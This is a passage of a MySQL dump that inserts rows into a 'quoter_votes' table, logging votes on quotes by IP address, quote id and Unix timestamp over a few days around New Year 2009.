  (9380,'65.55.105.192','',0,253,1230656777),
  (9381,'65.55.110.47','',0,253,1230657194),
  (9382,'94.248.105.145','',0,165,1230657897),
  (9383,'74.6.22.154','',0,259,1230658482),
  (9384,'79.171.124.210','',0,306,1230658647),
  (9385,'66.249.66.47','',0,311,1230658754),
  (9386,'66.249.66.47','',0,306,1230658803),
  (9387,'74.6.22.154','',0,233,1230659402),
  (9388,'66.249.66.47','',0,312,1230659859),
  (9389,'79.171.124.210','',0,310,1230663130),
  (9390,'66.249.66.47','',0,292,1230663551),
  (9391,'79.171.124.210','',0,255,1230663645),
  (9392,'74.6.22.154','',0,50,1230663834),
  (9393,'66.249.66.47','',0,296,1230664202),
  (9394,'66.249.66.47','',0,307,1230664434),
  (9395,'65.55.105.207','',0,251,1230667100),
  (9396,'65.55.110.227','',0,251,1230667271),
  (9397,'89.113.208.195','',0,310,1230668305),
  (9398,'89.113.208.195','',0,106,1230669285),
  (9399,'89.113.208.195','',0,76,1230669497),
  (9400,'66.249.66.47','',0,297,1230669998),
  (9401,'66.249.66.47','',0,305,1230670316),
  (9402,'66.249.66.47','',0,304,1230670504),
  (9403,'66.249.66.47','',0,299,1230670568),
  (9404,'74.6.22.154','',0,89,1230670709),
  (9405,'64.1.215.165','',0,138,1230671231),
  (9406,'66.249.66.47','',0,309,1230671325),
  (9407,'64.1.215.165','',0,133,1230671422),
  (9408,'66.249.66.47','',0,311,1230671538),
  (9409,'66.249.66.47','',0,292,1230672022),
  (9410,'74.6.22.154','',0,75,1230672419),
  (9411,'92.126.219.181','',0,286,1230672421),
  (9412,'66.249.66.47','',0,298,1230672475),
  (9413,'93.84.44.123','',0,299,1230672957),
  (9414,'64.1.215.165','',0,144,1230673228),
  (9415,'74.6.22.154','',0,245,1230673606),
  (9416,'193.200.150.45','',0,299,1230673784),
  (9417,'67.159.44.138','',0,299,1230673868),
  (9418,'202.71.103.82','',0,299,1230673871),
  (9419,'83.167.101.24','',0,299,1230673893),
  (9420,'79.174.64.146','',0,299,1230673955),
  (9421,'83.222.23.249','',0,299,1230674029),
  (9422,'91.204.161.125','',0,299,1230674035),
  (9423,'89.223.26.216','',0,62,1230674507),
  (9424,'64.1.215.165','',0,155,1230675709),
  (9425,'74.6.22.154','',0,307,1230675937),
  (9426,'74.6.22.154','',0,111,1230676221),
  (9427,'91.124.190.115','',0,306,1230676474),
  (9428,'78.24.225.224','',0,1,1230676950),
  (9429,'193.19.111.44','',0,310,1230677819),
  (9430,'64.1.215.165','',0,107,1230678107),
  (9431,'94.181.241.27','',0,310,1230678797),
  (9432,'74.6.22.154','',0,234,1230678880),
  (9433,'94.181.241.27','',0,305,1230679012),
  (9434,'79.175.2.21','',0,55,1230680952),
  (9435,'79.175.2.21','',0,29,1230680987),
  (9436,'79.175.2.21','',0,310,1230681288),
  (9437,'64.1.215.165','',0,265,1230681297),
  (9438,'79.175.2.215','',0,308,1230681323),
  (9439,'79.175.2.21','',0,298,1230681384),
  (9440,'79.175.2.221','',0,297,1230681405),
  (9441,'79.175.2.21','',0,289,1230681441),
  (9442,'79.175.2.21','',0,286,1230681726),
  (9443,'64.1.215.165','',0,118,1230681750),
  (9444,'79.175.2.81','',0,249,1230681832),
  (9445,'79.175.2.21','',0,247,1230681848),
  (9446,'79.175.2.21','',0,246,1230681863),
  (9447,'79.175.2.21','',0,243,1230681878),
  (9448,'79.175.2.21','',0,238,1230681925),
  (9449,'79.175.2.21','',0,231,1230682096),
  (9450,'79.175.2.51','',0,229,1230682109),
  (9451,'79.175.2.187','',0,223,1230682123),
  (9452,'79.175.2.41','',0,219,1230682427),
  (9453,'79.175.2.41','',0,218,1230682445),
  (9454,'79.175.2.41','',0,214,1230682504),
  (9455,'79.175.2.108','',0,208,1230682562),
  (9456,'79.175.2.154','',0,207,1230682580),
  (9457,'79.175.2.41','',0,205,1230682611),
  (9458,'79.175.2.41','',0,204,1230682613),
  (9459,'79.175.2.41','',0,203,1230682633),
  (9460,'79.175.2.41','',0,197,1230682678),
  (9461,'79.175.2.41','',0,195,1230682698),
  (9462,'79.175.2.41','',0,177,1230682763),
  (9463,'79.175.2.41','',0,163,1230682876),
  (9464,'77.79.176.117','',0,309,1230682924),
  (9465,'79.175.2.41','',0,154,1230682936),
  (9466,'79.175.2.41','',0,146,1230682945),
  (9467,'79.175.2.41','',0,138,1230683033),
  (9468,'79.175.2.41','',0,136,1230683044),
  (9469,'79.175.2.41','',0,134,1230683073),
  (9470,'79.175.2.41','',0,129,1230683096),
  (9471,'79.175.2.41','',0,124,1230683149),
  (9472,'79.175.2.41','',0,119,1230683175),
  (9473,'79.175.2.41','',0,118,1230683203),
  (9474,'79.175.2.41','',0,115,1230683210),
  (9475,'79.175.2.41','',0,114,1230683222),
  (9476,'79.175.2.41','',0,113,1230683234),
  (9477,'79.175.2.41','',0,111,1230683242),
  (9478,'77.79.176.117','',0,292,1230683259),
  (9479,'79.175.2.41','',0,110,1230683273),
  (9480,'79.175.2.41','',0,108,1230683281),
  (9481,'79.175.2.41','',0,107,1230683288),
  (9482,'79.175.2.41','',0,106,1230683314),
  (9483,'79.175.2.41','',0,105,1230683340),
  (9484,'79.175.2.41','',0,100,1230683399),
  (9485,'79.175.2.41','',0,99,1230683416),
  (9486,'79.175.2.41','',0,98,1230683433),
  (9487,'79.175.2.41','',0,93,1230683458),
  (9488,'79.175.2.21','',0,89,1230683480),
  (9489,'79.175.2.21','',0,88,1230683490),
  (9490,'79.175.2.21','',0,87,1230683495),
  (9491,'79.175.2.21','',0,86,1230683507),
  (9492,'79.175.2.21','',0,85,1230683513),
  (9493,'79.175.2.21','',0,81,1230683535),
  (9494,'77.79.176.117','',0,262,1230683541),
  (9495,'79.175.2.21','',0,80,1230683545),
  (9496,'79.175.2.21','',0,76,1230683571),
  (9497,'79.175.2.21','',0,74,1230683809),
  (9498,'79.175.2.21','',0,73,1230683825),
  (9499,'79.175.2.21','',0,66,1230683871),
  (9500,'79.175.2.21','',0,63,1230683877);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 9500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (9501,'79.175.2.21','',0,53,1230684048),
  (9502,'79.175.2.21','',0,30,1230684312),
  (9503,'79.175.2.21','',0,25,1230684334),
  (9504,'79.175.2.21','',0,24,1230684337),
  (9505,'77.79.176.117','',0,185,1230684342),
  (9506,'79.175.2.21','',0,16,1230684350),
  (9507,'79.175.2.21','',0,20,1230684369),
  (9508,'79.175.2.21','',0,11,1230684390),
  (9509,'79.175.2.21','',0,2,1230684464),
  (9510,'74.6.22.154','',0,223,1230684697),
  (9511,'64.1.215.165','',0,289,1230685220),
  (9512,'64.1.215.165','',0,20,1230685486),
  (9513,'85.141.82.53','',0,292,1230686033),
  (9514,'77.88.30.246','',0,309,1230686106),
  (9515,'77.88.30.246','',0,89,1230686128),
  (9516,'77.88.30.246','',0,23,1230686139),
  (9517,'77.88.30.246','',0,304,1230686153),
  (9518,'77.88.30.246','',0,11,1230686168),
  (9519,'77.88.30.246','',0,307,1230686192),
  (9520,'77.88.30.246','',0,298,1230686200),
  (9521,'77.88.30.246','',0,102,1230686206),
  (9522,'77.88.30.246','',0,310,1230686215),
  (9523,'74.6.22.154','',0,94,1230686227),
  (9524,'77.88.30.246','',0,303,1230686236),
  (9525,'85.141.82.53','',0,290,1230686240),
  (9526,'77.88.30.246','',0,308,1230686255),
  (9527,'85.141.82.53','',0,286,1230686287),
  (9528,'77.88.30.246','',0,99,1230686299),
  (9529,'77.88.30.246','',0,306,1230686348),
  (9530,'77.88.30.246','',0,296,1230686430),
  (9531,'85.141.82.53','',0,270,1230686476),
  (9532,'77.88.30.246','',0,60,1230686473),
  (9533,'77.88.30.246','',0,305,1230686518),
  (9534,'77.88.30.246','',0,55,1230686528),
  (9535,'80.237.112.245','',0,312,1230686775),
  (9536,'74.6.22.154','',0,100,1230686876),
  (9537,'85.141.82.53','',0,229,1230686984),
  (9538,'85.141.82.53','',0,220,1230687080),
  (9539,'85.141.82.53','',0,215,1230687200),
  (9540,'85.141.82.53','',0,212,1230687277),
  (9541,'85.141.82.53','',0,202,1230687331),
  (9542,'64.1.215.165','',0,106,1230687372),
  (9543,'85.141.82.53','',0,195,1230687402),
  (9544,'85.141.82.53','',0,178,1230687538),
  (9545,'64.1.215.165','',0,103,1230690135),
  (9546,'86.57.222.6','',0,299,1230690721),
  (9547,'64.1.215.165','',0,56,1230692003),
  (9548,'88.204.16.169','',0,310,1230692824),
  (9549,'174.36.207.234','',0,318,1230695353),
  (9550,'174.36.207.234','',0,317,1230695359),
  (9551,'174.36.207.234','',0,316,1230695368),
  (9552,'174.36.207.234','',0,315,1230695377),
  (9553,'174.36.207.234','',0,314,1230695384),
  (9554,'174.36.207.234','',0,313,1230695389),
  (9555,'174.36.207.234','',0,312,1230695395),
  (9556,'174.36.207.234','',0,311,1230695403),
  (9557,'174.36.207.234','',0,310,1230695413),
  (9558,'174.36.207.234','',0,309,1230695419),
  (9559,'174.36.207.234','',0,305,1230695484),
  (9560,'174.36.207.234','',0,304,1230695490),
  (9561,'174.36.207.234','',0,297,1230695501),
  (9562,'174.36.207.234','',0,291,1230695510),
  (9563,'174.36.207.234','',0,288,1230695516),
  (9564,'174.36.207.234','',0,287,1230695525),
  (9565,'174.36.207.234','',0,279,1230695534),
  (9566,'174.36.207.234','',0,274,1230695542),
  (9567,'174.36.207.234','',0,270,1230695553),
  (9568,'174.36.207.234','',0,299,1230695592),
  (9569,'174.36.207.234','',0,298,1230695602),
  (9570,'174.36.207.234','',0,296,1230695614),
  (9571,'174.36.207.234','',0,292,1230695625),
  (9572,'174.36.207.234','',0,255,1230695632),
  (9573,'174.36.207.234','',0,251,1230695639),
  (9574,'174.36.207.234','',0,241,1230695647),
  (9575,'174.36.207.234','',0,240,1230695657),
  (9576,'174.36.207.234','',0,303,1230695682),
  (9577,'174.36.207.234','',0,290,1230695694),
  (9578,'174.36.207.234','',0,283,1230695705),
  (9579,'174.36.207.234','',0,249,1230695712),
  (9580,'174.36.207.234','',0,231,1230695722),
  (9581,'174.36.207.234','',0,230,1230695729),
  (9582,'174.36.207.234','',0,220,1230695738),
  (9583,'174.36.207.234','',0,207,1230695744),
  (9584,'174.36.207.234','',0,205,1230695755),
  (9585,'174.36.207.234','',0,184,1230695761),
  (9586,'174.36.207.234','',0,286,1230695800),
  (9587,'174.36.207.234','',0,248,1230695812),
  (9588,'174.36.207.234','',0,247,1230695825),
  (9589,'174.36.207.234','',0,235,1230695833),
  (9590,'174.36.207.234','',0,227,1230695840),
  (9591,'174.36.207.234','',0,216,1230695853),
  (9592,'174.36.207.234','',0,215,1230695860),
  (9593,'174.36.207.234','',0,213,1230695868),
  (9594,'174.36.207.234','',0,212,1230695879),
  (9595,'174.36.207.234','',0,258,1230695900),
  (9596,'174.36.207.234','',0,246,1230695911),
  (9597,'174.36.207.234','',0,163,1230695919),
  (9598,'174.36.207.234','',0,143,1230695926),
  (9599,'174.36.207.234','',0,139,1230695935),
  (9600,'174.36.207.234','',0,133,1230695950),
  (9601,'174.36.207.234','',0,111,1230695957),
  (9602,'174.36.207.234','',0,89,1230695966),
  (9603,'174.36.207.234','',0,77,1230695972),
  (9604,'174.36.207.234','',0,70,1230695980),
  (9605,'74.6.18.227','',0,316,1230695988),
  (9606,'174.36.207.234','',0,272,1230695994),
  (9607,'174.36.207.234','',0,256,1230696008),
  (9608,'174.36.207.234','',0,243,1230696018),
  (9609,'174.36.207.234','',0,234,1230696029),
  (9610,'74.6.18.227','',0,317,1230696046),
  (9611,'174.36.207.234','',0,229,1230696046),
  (9612,'174.36.207.234','',0,203,1230696054),
  (9613,'174.36.207.234','',0,147,1230696063),
  (9614,'174.36.207.234','',0,113,1230696074),
  (9615,'174.36.207.234','',0,88,1230696081),
  (9616,'174.36.207.234','',0,87,1230696089),
  (9617,'174.36.207.234','',0,245,1230696107),
  (9618,'174.36.207.234','',0,152,1230696116),
  (9619,'174.36.207.234','',0,125,1230696124),
  (9620,'174.36.207.234','',0,99,1230696132),
  (9621,'174.36.207.234','',0,62,1230696140),
  (9622,'174.36.207.234','',0,50,1230696151),
  (9623,'174.36.207.234','',0,289,1230696159),
  (9624,'174.36.207.234','',0,265,1230696171),
  (9625,'174.36.207.234','',0,144,1230696179),
  (9626,'174.36.207.234','',0,130,1230696186),
  (9627,'174.36.207.234','',0,85,1230696195),
  (9628,'174.36.207.234','',0,84,1230696208),
  (9629,'174.36.207.234','',0,12,1230696216),
  (9630,'174.36.207.234','',0,221,1230696231),
  (9631,'174.36.207.234','',0,118,1230696241),
  (9632,'74.6.18.227','',0,318,1230696242),
  (9633,'174.36.207.234','',0,110,1230696253),
  (9634,'174.36.207.234','',0,74,1230696266),
  (9635,'174.36.207.234','',0,24,1230696274),
  (9636,'174.36.207.234','',0,23,1230696284),
  (9637,'174.36.207.234','',0,308,1230696299),
  (9638,'174.36.207.234','',0,307,1230696310),
  (9639,'174.36.207.234','',0,138,1230696318),
  (9640,'174.36.207.234','',0,100,1230696328),
  (9641,'174.36.207.234','',0,60,1230696341),
  (9642,'174.36.207.234','',0,55,1230696356),
  (9643,'174.36.207.234','',0,236,1230696369),
  (9644,'174.36.207.234','',0,136,1230696379),
  (9645,'174.36.207.234','',0,135,1230696390),
  (9646,'174.36.207.234','',0,73,1230696400),
  (9647,'174.36.207.234','',0,58,1230696410),
  (9648,'174.36.207.234','',0,44,1230696421),
  (9649,'174.36.207.234','',0,253,1230696430),
  (9650,'174.36.207.234','',0,219,1230696442),
  (9651,'174.36.207.234','',0,134,1230696455),
  (9652,'174.36.207.234','',0,306,1230696466),
  (9653,'174.36.207.234','',0,264,1230696496),
  (9654,'174.36.207.234','',0,263,1230696506),
  (9655,'174.36.207.234','',0,262,1230696516),
  (9656,'174.36.207.234','',0,259,1230696525),
  (9657,'174.36.207.234','',0,254,1230696562),
  (9658,'174.36.207.234','',0,250,1230696569),
  (9659,'174.36.207.234','',0,6,1230696590),
  (9660,'174.36.207.234','',0,4,1230696597),
  (9661,'174.36.207.234','',0,3,1230696608),
  (9662,'174.36.207.234','',0,2,1230696616),
  (9663,'174.36.207.234','',0,1,1230696623),
  (9664,'174.36.207.234','',0,56,1230696659),
  (9665,'174.36.207.234','',0,173,1230696669),
  (9666,'174.36.207.234','',0,120,1230696683),
  (9667,'174.36.207.234','',0,119,1230696699),
  (9668,'174.36.207.234','',0,109,1230696706),
  (9669,'174.36.207.234','',0,140,1230696714),
  (9670,'174.36.207.234','',0,29,1230696730),
  (9671,'174.36.207.234','',0,21,1230696739),
  (9672,'174.36.207.234','',0,18,1230696749),
  (9673,'174.36.207.234','',0,242,1230696897),
  (9674,'74.6.18.227','',0,125,1230697238),
  (9675,'74.6.18.227','',0,207,1230697817),
  (9676,'66.249.66.47','',0,11,1230698172),
  (9677,'74.6.18.227','',0,144,1230699045),
  (9678,'74.6.18.227','',0,18,1230699053),
  (9679,'74.6.18.227','',0,118,1230699463),
  (9680,'66.249.66.47','',0,253,1230700612),
  (9681,'195.222.177.74','',0,311,1230700829),
  (9682,'195.222.177.74','',0,310,1230700843),
  (9683,'195.222.177.74','',0,251,1230700892),
  (9684,'64.1.215.165','',0,2,1230703289),
  (9685,'74.6.18.227','',0,317,1230704417),
  (9686,'74.6.18.227','',0,74,1230704822),
  (9687,'64.1.215.165','',0,122,1230705120),
  (9688,'66.249.66.47','',0,11,1230705939),
  (9689,'79.143.35.162','',0,259,1230706311),
  (9690,'66.249.66.47','',0,255,1230706772),
  (9691,'74.6.18.227','',0,138,1230706947),
  (9692,'66.249.66.47','',0,251,1230707564),
  (9693,'79.132.105.4','',0,318,1230710775),
  (9694,'79.132.105.4','',0,311,1230710816),
  (9695,'79.132.105.4','',0,310,1230710829),
  (9696,'79.132.105.4','',0,299,1230710882),
  (9697,'79.132.105.4','',0,298,1230710911),
  (9698,'66.249.66.47','',0,264,1230711271),
  (9699,'66.249.66.47','',0,316,1230711349),
  (9700,'66.249.66.47','',0,314,1230711470),
  (9701,'74.6.18.227','',0,314,1230712219),
  (9702,'74.6.18.227','',0,312,1230712249),
  (9703,'74.6.18.227','',0,313,1230712253),
  (9704,'74.6.18.227','',0,315,1230712278),
  (9705,'66.249.66.47','',0,317,1230712323),
  (9706,'74.6.18.227','',0,246,1230712357),
  (9707,'66.249.66.47','',0,313,1230712541),
  (9708,'66.249.66.47','',0,90,1230712747),
  (9709,'66.249.66.47','',0,315,1230712949),
  (9710,'66.249.66.47','',0,318,1230713111),
  (9711,'82.199.109.200','',0,55,1230713995),
  (9712,'90.188.184.197','',0,286,1230715292),
  (9713,'66.249.66.47','',0,234,1230715574),
  (9714,'74.6.18.227','',0,73,1230715787),
  (9715,'74.6.18.227','',0,262,1230715885),
  (9716,'95.24.43.250','',0,318,1230716957),
  (9717,'87.119.231.25','',0,299,1230717545),
  (9718,'217.159.130.58','',0,309,1230717773),
  (9719,'87.119.231.25','',0,120,1230717805),
  (9720,'74.6.18.227','',0,222,1230718051),
  (9721,'74.6.18.227','',0,88,1230720957),
  (9722,'74.6.18.227','',0,87,1230721015),
  (9723,'61.117.184.219','',0,311,1230721546),
  (9724,'61.117.184.219','',0,310,1230721556),
  (9725,'94.50.193.238','',0,318,1230723310),
  (9726,'74.6.18.227','',0,230,1230724041),
  (9727,'93.80.227.177','',0,299,1230724369),
  (9728,'93.80.227.177','',0,286,1230724374),
  (9729,'93.80.227.177','',0,298,1230724382),
  (9730,'74.6.18.227','',0,240,1230725116),
  (9731,'85.141.167.133','',0,315,1230725652),
  (9732,'89.223.118.114','',0,286,1230726568),
  (9733,'67.202.43.229','',0,298,1230727040),
  (9734,'77.45.233.199','',0,316,1230728748),
  (9735,'94.253.24.32','',0,310,1230730077),
  (9736,'86.57.222.6','',0,299,1230731559),
  (9737,'77.122.32.72','',0,319,1230731646),
  (9738,'67.195.37.171','',0,288,1230732090),
  (9739,'78.106.237.71','',0,279,1230734060),
  (9740,'217.118.93.39','',0,119,1230734626),
  (9741,'85.113.139.34','',0,299,1230738469),
  (9742,'85.113.139.34','',0,55,1230738474),
  (9743,'85.113.139.34','',0,212,1230738481),
  (9744,'86.57.222.6','',0,299,1230739660),
  (9745,'74.6.18.227','',0,195,1230743190),
  (9746,'74.6.18.227','',0,44,1230743577),
  (9747,'74.6.18.227','',0,89,1230745124),
  (9748,'74.6.18.227','',0,233,1230746714),
  (9749,'79.171.124.210','',0,318,1230748738),
  (9750,'93.80.217.215','',0,298,1230751898),
  (9751,'193.238.153.30','',0,314,1230753874),
  (9752,'193.238.153.30','',0,316,1230753955),
  (9753,'74.6.18.227','',0,55,1230755589),
  (9754,'74.6.18.227','',0,256,1230756989),
  (9755,'74.6.18.227','',0,240,1230758566),
  (9756,'74.6.18.227','',0,62,1230758699),
  (9757,'74.6.18.227','',0,270,1230758736),
  (9758,'74.6.18.227','',0,243,1230758885),
  (9759,'77.88.30.246','',0,317,1230760137),
  (9760,'77.88.30.246','',0,316,1230760151),
  (9761,'77.88.30.246','',0,311,1230760180),
  (9762,'77.88.30.246','',0,318,1230760188),
  (9763,'77.88.30.246','',0,315,1230760195),
  (9764,'77.88.30.246','',0,314,1230760242),
  (9765,'77.88.30.246','',0,89,1230760316),
  (9766,'77.88.30.246','',0,312,1230760337),
  (9767,'77.88.30.246','',0,313,1230760349),
  (9768,'77.88.30.246','',0,99,1230760404),
  (9769,'74.6.18.227','',0,12,1230760781),
  (9770,'66.249.66.47','',0,109,1230760874),
  (9771,'82.207.17.233','',0,312,1230762815),
  (9772,'74.6.18.227','',0,315,1230765373),
  (9773,'66.249.66.47','',0,23,1230766456),
  (9774,'74.6.18.227','',0,125,1230767713),
  (9775,'86.57.222.6','',0,299,1230768006),
  (9776,'74.6.18.227','',0,133,1230770565),
  (9777,'66.249.66.47','',0,24,1230771153),
  (9778,'74.6.18.227','',0,84,1230771525),
  (9779,'66.249.66.47','',0,319,1230773683),
  (9780,'66.249.66.47','',0,18,1230775887),
  (9781,'66.249.66.47','',0,16,1230776503),
  (9782,'74.6.18.227','',0,297,1230778604),
  (9783,'66.249.66.47','',0,109,1230780972),
  (9784,'74.6.18.227','',0,219,1230781168),
  (9785,'66.249.66.47','',0,319,1230782313),
  (9786,'66.249.66.47','',0,23,1230783134),
  (9787,'74.6.18.227','',0,165,1230786068),
  (9788,'74.6.18.227','',0,185,1230786461),
  (9789,'74.6.18.227','',0,246,1230786947),
  (9790,'74.6.18.227','',0,242,1230787808),
  (9791,'66.249.66.47','',0,16,1230787908),
  (9792,'66.249.66.47','',0,18,1230790621),
  (9793,'66.249.66.47','',0,259,1230791701),
  (9794,'66.249.66.47','',0,24,1230792028),
  (9795,'74.6.18.227','',0,140,1230792152),
  (9796,'74.6.18.227','',0,130,1230796456),
  (9797,'81.25.38.201','',0,259,1230796994),
  (9798,'74.6.18.227','',0,319,1230798783),
  (9799,'66.249.66.47','',0,133,1230798843),
  (9800,'66.249.66.47','',0,135,1230799140),
  (9801,'74.6.18.227','',0,231,1230799212),
  (9802,'66.249.66.47','',0,136,1230799288),
  (9803,'66.249.66.47','',0,246,1230799909),
  (9804,'74.6.18.227','',0,86,1230800094),
  (9805,'66.249.66.47','',0,139,1230800324),
  (9806,'92.241.182.23','',0,215,1230800548),
  (9807,'66.249.66.47','',0,245,1230801017),
  (9808,'66.249.66.47','',0,241,1230801027),
  (9809,'74.6.18.227','',0,138,1230801036),
  (9810,'74.6.18.227','',0,77,1230801278),
  (9811,'66.249.66.47','',0,242,1230801833),
  (9812,'66.249.66.47','',0,240,1230801838),
  (9813,'66.249.66.47','',0,137,1230804442),
  (9814,'74.6.18.227','',0,144,1230804917),
  (9815,'66.249.66.47','',0,134,1230805084),
  (9816,'74.6.18.227','',0,274,1230805205),
  (9817,'66.249.66.47','',0,3,1230805345),
  (9818,'74.6.18.227','',0,177,1230807635),
  (9819,'66.249.66.47','',0,16,1230809386),
  (9820,'74.6.18.227','',0,189,1230810005),
  (9821,'74.6.18.227','',0,216,1230810553),
  (9822,'66.249.66.47','',0,133,1230811511),
  (9823,'74.6.18.227','',0,178,1230812703),
  (9824,'74.6.18.227','',0,85,1230812915),
  (9825,'66.249.66.47','',0,136,1230813445),
  (9826,'66.249.66.47','',0,135,1230813501),
  (9827,'156.17.237.13','',0,318,1230813504),
  (9828,'156.17.237.13','',0,310,1230813616),
  (9829,'86.57.222.6','',0,299,1230813956),
  (9830,'74.6.18.227','',0,254,1230814975),
  (9831,'92.241.182.25','',0,215,1230819919),
  (9832,'92.241.182.25','',0,215,1230819919),
  (9833,'74.6.18.227','',0,172,1230820260),
  (9834,'78.50.92.246','',0,212,1230822592),
  (9835,'74.6.18.227','',0,152,1230822824),
  (9836,'91.185.53.59','',0,319,1230823100),
  (9837,'91.185.53.59','',0,85,1230823182),
  (9838,'94.181.238.228','',0,318,1230825094),
  (9839,'194.85.160.55','',0,313,1230828072),
  (9840,'194.85.160.55','',0,311,1230828082),
  (9841,'193.110.20.4','',0,55,1230829202),
  (9842,'74.6.18.227','',0,229,1230832626),
  (9843,'74.6.18.227','',0,272,1230833392),
  (9844,'77.35.27.120','',0,320,1230834431),
  (9845,'77.35.27.120','',0,318,1230834466),
  (9846,'77.35.27.120','',0,317,1230834543),
  (9847,'77.35.27.120','',0,313,1230834642),
  (9848,'77.35.27.120','',0,304,1230834752),
  (9849,'77.35.27.120','',0,303,1230834797),
  (9850,'77.35.27.120','',0,298,1230834841),
  (9851,'77.35.27.120','',0,286,1230835087),
  (9852,'74.6.18.227','',0,24,1230837660),
  (9853,'74.6.18.227','',0,6,1230838938),
  (9854,'91.122.22.106','',0,212,1230840397),
  (9855,'91.122.22.106','',0,314,1230840434),
  (9856,'66.231.188.53','',0,315,1230842111),
  (9857,'77.88.30.246','',0,319,1230843328),
  (9858,'91.78.229.175','',0,321,1230844426),
  (9859,'91.78.229.175','',0,320,1230844449),
  (9860,'74.6.18.227','',0,130,1230847047),
  (9861,'91.122.22.106','',0,119,1230847490),
  (9862,'74.6.18.227','',0,203,1230848849),
  (9863,'66.231.188.53','',0,316,1230849079),
  (9864,'74.6.18.227','',0,227,1230849129),
  (9865,'156.17.237.13','',0,318,1230849761),
  (9866,'67.195.37.171','',0,314,1230850877),
  (9867,'74.6.18.227','',0,9,1230850901),
  (9868,'67.195.37.171','',0,316,1230850907),
  (9869,'67.195.37.171','',0,313,1230850944),
  (9870,'67.195.37.171','',0,320,1230850973),
  (9871,'67.195.37.171','',0,317,1230851634),
  (9872,'67.195.37.171','',0,318,1230852110),
  (9873,'66.249.72.101','',0,8,1230852905),
  (9874,'66.231.188.53','',0,312,1230860377),
  (9875,'91.122.22.106','',0,212,1230860788),
  (9876,'74.6.18.227','',0,55,1230861193),
  (9877,'67.195.37.171','',0,314,1230864426),
  (9878,'66.249.72.101','',0,8,1230864946),
  (9879,'74.6.18.227','',0,1,1230866062),
  (9880,'74.6.18.227','',0,199,1230866113),
  (9881,'74.6.18.227','',0,206,1230867306),
  (9882,'67.195.37.185','',0,299,1230869538),
  (9883,'74.6.18.227','',0,279,1230870882),
  (9884,'74.6.18.227','',0,189,1230871813),
  (9885,'66.249.72.101','',0,53,1230872546),
  (9886,'202.71.103.82','',0,299,1230874056),
  (9887,'74.6.18.227','',0,221,1230875740),
  (9888,'66.249.72.101','',0,12,1230876440),
  (9889,'67.195.37.171','',0,321,1230876938),
  (9890,'91.202.197.79','',0,320,1230876979),
  (9891,'91.202.197.79','',0,317,1230876993),
  (9892,'91.202.197.79','',0,315,1230876995),
  (9893,'91.202.197.79','',0,312,1230877000),
  (9894,'74.6.18.227','',0,2,1230877415),
  (9895,'78.24.224.13','',0,1,1230878077),
  (9896,'78.24.224.13','',0,299,1230878151),
  (9897,'66.249.72.101','',0,111,1230880076),
  (9898,'74.6.18.227','',0,99,1230880752),
  (9899,'81.25.38.201','',0,321,1230881011),
  (9900,'74.6.18.227','',0,87,1230883079),
  (9901,'67.195.37.171','',0,315,1230883449),
  (9902,'80.64.175.14','',0,320,1230883538),
  (9903,'66.249.72.101','',0,95,1230883550),
  (9904,'74.6.18.227','',0,8,1230883568),
  (9905,'66.249.72.101','',0,81,1230883664),
  (9906,'92.113.164.75','',0,56,1230884863),
  (9907,'92.113.164.75','',0,243,1230884930),
  (9908,'66.249.72.101','',0,141,1230885083),
  (9909,'74.6.18.227','',0,272,1230885144),
  (9910,'66.249.72.101','',0,12,1230885405),
  (9911,'66.249.72.101','',0,321,1230886117),
  (9912,'74.6.18.227','',0,190,1230888068),
  (9913,'74.6.18.227','',0,259,1230889352),
  (9914,'217.159.130.58','',0,321,1230889887),
  (9915,'74.6.18.227','',0,212,1230890810),
  (9916,'91.185.54.186','',0,321,1230893003),
  (9917,'78.106.35.136','',0,246,1230893069),
  (9918,'72.30.81.151','',0,253,1230894236),
  (9919,'72.30.81.151','',0,197,1230895476),
  (9920,'156.17.237.13','',0,318,1230895710),
  (9921,'66.249.72.101','',0,320,1230899321),
  (9922,'193.200.68.210','',0,287,1230900453),
  (9923,'193.200.68.210','',0,288,1230900457),
  (9924,'85.249.160.3','',0,318,1230901027),
  (9925,'85.249.160.3','',0,317,1230901052),
  (9926,'85.249.160.3','',0,316,1230901066),
  (9927,'72.30.81.151','',0,216,1230903808),
  (9928,'78.37.119.93','',0,212,1230904827),
  (9929,'78.37.119.93','',0,299,1230904839),
  (9930,'78.37.119.93','',0,321,1230905723),
  (9931,'92.50.248.33','',0,318,1230905825),
  (9932,'92.50.248.33','',0,305,1230906055),
  (9933,'156.17.237.13','',0,321,1230908480),
  (9934,'82.207.15.171','',0,320,1230908909),
  (9935,'91.202.197.79','',0,318,1230910381),
  (9936,'91.202.197.79','',0,299,1230910924),
  (9937,'91.202.197.79','',0,286,1230910955),
  (9938,'91.202.197.79','',0,322,1230912050),
  (9939,'88.204.72.214','',0,318,1230912927),
  (9940,'88.204.72.214','',0,312,1230913096),
  (9941,'88.204.72.214','',0,311,1230913116),
  (9942,'88.204.72.214','',0,310,1230913132),
  (9943,'88.204.72.214','',0,286,1230913291),
  (9944,'81.18.116.69','',0,321,1230913363),
  (9945,'88.204.72.214','',0,265,1230913402),
  (9946,'88.204.72.214','',0,272,1230913485),
  (9947,'88.204.72.214','',0,247,1230913617),
  (9948,'91.78.229.127','',0,321,1230914940),
  (9949,'72.30.81.151','',0,229,1230915401),
  (9950,'85.223.207.208','',0,322,1230916380),
  (9951,'85.223.207.208','',0,321,1230916382),
  (9952,'85.223.207.208','',0,320,1230916385),
  (9953,'85.223.207.208','',0,319,1230916388),
  (9954,'85.223.207.208','',0,318,1230916391),
  (9955,'85.223.207.208','',0,317,1230916399),
  (9956,'85.223.207.208','',0,316,1230916399),
  (9957,'85.223.207.208','',0,315,1230916403),
  (9958,'85.223.207.208','',0,313,1230916404),
  (9959,'85.223.207.208','',0,312,1230916406),
  (9960,'91.207.204.208','',0,321,1230920574),
  (9961,'91.207.204.208','',0,320,1230920614),
  (9962,'85.198.132.19','',0,322,1230922551),
  (9963,'72.30.81.151','',0,227,1230922731),
  (9964,'72.30.81.151','',0,265,1230924336),
  (9965,'66.249.72.101','',0,320,1230925207),
  (9966,'72.30.81.151','',0,253,1230926197),
  (9967,'72.30.81.151','',0,274,1230929305),
  (9968,'92.46.241.28','',0,321,1230929566),
  (9969,'72.30.81.151','',0,241,1230929696),
  (9970,'66.231.188.53','',0,321,1230930268),
  (9971,'91.124.221.163','',0,164,1230931015),
  (9972,'77.88.30.246','',0,320,1230931268),
  (9973,'77.88.30.246','',0,90,1230931275),
  (9974,'77.88.30.246','',0,321,1230931287),
  (9975,'67.195.37.171','',0,321,1230932454),
